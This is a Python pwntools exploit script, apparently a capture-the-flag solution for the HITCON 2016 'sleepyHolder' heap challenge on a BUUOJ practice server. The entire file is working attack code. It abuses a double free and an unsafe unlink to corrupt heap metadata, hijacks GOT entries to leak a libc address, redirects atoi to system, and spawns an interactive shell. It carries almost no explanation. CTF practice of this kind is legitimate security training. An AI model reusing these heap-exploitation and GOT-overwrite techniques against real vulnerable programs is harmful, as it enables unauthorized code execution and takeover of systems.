#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/27 15:25:49
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('./sleepyHolder_hitcon_2016')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 25067
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./sleepyHolder_hitcon_2016')
free_got = 0x602018
puts_plt = 0x400760
puts_got = 0x602020
atoi_got = 0x602080
def cmd(choice):
    sh.recvuntil("3. Renew secret\n")
    sh.sendline(str(choice))

def add(choice,content):
    cmd(1)
    sh.recvuntil("What secret do you want to keep?") #1 0x28 2 0xfa0 3 huge
    sh.sendline(str(choice))
    sh.recvuntil("Tell me your secret: \n")
    sh.sendline(content)

def dele(choice):
    cmd(2)
    sh.recvuntil("2. Big secret\n")
    sh.sendline(str(choice))

def edit(choice,content):
    cmd(3)
    sh.recvuntil("2. Big secret\n")
    sh.sendline(str(choice))
    sh.recvuntil("Tell me your secret: \n")
    sh.send(content)

add(1,'a')
add(2,'a')
dele(1)
add(3,'a')
dele(1)
ptr = 0x6020d0
payload = p64(0) + p64(0x21) + p64(ptr-0x18) + p64(ptr-0x10) + p64(0x20)
add(1,payload)
dele(2)
payload = '\x00'*8+ p64(free_got) + p64(0) + p64(0x6020c0) + "\x01"
edit(1,payload)

edit(2,p64(puts_plt))
edit(1,p64(puts_got))
dele(2)
puts_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc_base = puts_addr - libc.symbols['puts']
log.info("libc_base=>{}".format(hex(libc_base)))
system_addr = libc_base + libc.symbols['system']
edit(1,'\x00'*0x10 + p64(atoi_got))
edit(1,p64(system_addr))
sh.sendline("sh\x00")
# gdb.attach(sh)
# pause()

sh.interactive()
